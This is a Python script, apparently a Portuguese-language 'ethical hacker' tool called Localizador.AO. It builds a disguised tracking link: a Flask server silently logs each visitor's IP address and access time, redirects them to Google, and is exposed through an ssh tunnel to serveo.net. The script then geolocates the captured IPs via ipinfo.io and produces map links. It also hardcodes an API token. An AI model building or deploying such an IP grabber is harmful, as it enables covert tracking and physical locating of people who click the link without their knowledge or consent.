import os
import requests
from flask import Flask, request, redirect
from threading import Thread
import subprocess
import time
import datetime
from rich.console import Console

API_TOKEN = os.getenv("API_TOKEN", "49e23b013f664c")
app = Flask(__name__)
captured_data = []

IDIOMA = "pt"
MENSAGENS = {
    "pt": {
        "menu": "Escolha uma opção: ",
        "saindo": "Saindo...",
        "opcoes": [
            "1. Redirecionar link e capturar IPs",
            "2. Exibir IPs capturados",
            "3. Localizar informações de um IP",
            "4. Instalar dependências",
            "5. Mostrar manual",
            "6. Sair"
        ],
    }
}

GREEN = '\033[92m'
RESET = '\033[0m'
TARGET_URL = "https://www.google.com"
console = Console()

def limpar_tela():
    os.system("clear" if os.name != "nt" else "cls")

@app.route("/")
def capture_and_redirect():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0]
    access_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    captured_data.append({"ip": ip, "hora": access_time})
    console.print(f"{GREEN}IP capturado: {ip} às {access_time}{RESET}")
    return redirect(TARGET_URL, code=302)

def start_flask():
    flask_thread = Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": 5000})
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(2)

def start_serveo():
    try:
        console.print("[cyan]Iniciando túnel com Serveo...[/cyan]")
        process = subprocess.Popen(
            ["ssh", "-R", "80:localhost:5000", "serveo.net"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        link_gerado = None
        while True:
            line = process.stdout.readline().strip()
            if "http://" in line or "https://" in line:
                link_gerado = line.strip()
                break
        if link_gerado:
            console.print("\n[bold green]Link gerado com sucesso![/bold green]")
            console.print(f"[bold cyan]Link: {link_gerado}[/bold cyan]")
            console.print("[bold yellow]Pressione CTRL+C para encerrar o servidor.[/bold yellow]")
            process.wait()
        else:
            console.print("[bold red]Erro ao gerar o link do Serveo.[/bold red]")
    except KeyboardInterrupt:
        console.print("\n[bold red]Servidor encerrado pelo usuário![/bold red]")
    except Exception as e:
        console.print(f"[bold red]Erro ao criar túnel: {e}[/bold red]")

def localizar_ip(ip):
    url = f"https://ipinfo.io/{ip}?token={API_TOKEN}"
    try:
        response = requests.get(url)
        data = response.json()
        if "bogon" in data:
            return "[bold yellow]IP reservado (bogon).[/bold yellow]"
        ip_info = {
            "IP": data.get("ip", "Desconhecido"),
            "Cidade": data.get("city", "Desconhecida"),
            "Região": data.get("region", "Desconhecida"),
            "País": data.get("country", "Desconhecido"),
            "Org": data.get("org", "Desconhecida"),
            "Lat/Lon": data.get("loc", "0,0")
        }
        return "\n".join(f"[cyan]{key}:[/cyan] {value}" for key, value in ip_info.items()) + f"\n[green]Mapa: https://www.google.com/maps?q={ip_info['Lat/Lon']}[/green]"
    except Exception as e:
        return f"[bold red]Erro ao localizar IP: {e}[/bold red]"

def instalar_dependencias():
    os.system("pkg update && pkg upgrade -y || sudo apt update && sudo apt upgrade -y")
    os.system("pkg install python git curl openssh -y || sudo apt install python3 git curl openssh-client -y")
    os.system("pip install flask rich requests")
    console.print("[bold green]Dependências instaladas com sucesso![/bold green]")

def mostrar_manual():
    manual = """
    [bold blue]Manual de Utilização:[/bold blue]
    - Escolha opções no menu para redirecionar links, capturar IPs e exibir logs.
    - Utilize 'Instalar Dependências' na primeira execução.
    """
    console.print(manual)

def menu():
    while True:
        limpar_tela()
        console.print("[bold blue]=== Localizador.AO ===[/bold blue]")
        console.print("[bold green]© 2024 Hacker Ético Milton Diogo[/bold green]")
        for i, opcao in enumerate(MENSAGENS[IDIOMA]["opcoes"], start=1):
            console.print(f"[bold green]{i}. {opcao}[/bold green]")
        escolha = input(MENSAGENS[IDIOMA]["menu"])
        if escolha == "1":
            start_flask()
            start_serveo()
        elif escolha == "2":
            limpar_tela()
            if captured_data:
                for i, data in enumerate(captured_data, 1):
                    console.print(f"[cyan]{i}. IP: {data['ip']} | Hora: {data['hora']}[/cyan]")
            else:
                console.print("[bold red]Nenhum IP capturado ainda.[/bold red]")
            input("[bold green]Pressione Enter para voltar ao menu.[/bold green]")
        elif escolha == "3":
            ip = input("Digite o IP: ").strip()
            console.print(localizar_ip(ip))
            input("[bold green]Pressione Enter para voltar ao menu.[/bold green]")
        elif escolha == "4":
            instalar_dependencias()
            input("[bold green]Pressione Enter para voltar ao menu.[/bold green]")
        elif escolha == "5":
            mostrar_manual()
            input("[bold green]Pressione Enter para voltar ao menu.[/bold green]")
        elif escolha == "6":
            console.print("[bold green]Saindo...[/bold green]")
            break
        else:
            console.print("[bold red]Opção inválida![/bold red]")
            time.sleep(2)

if __name__ == "__main__":
    menu()
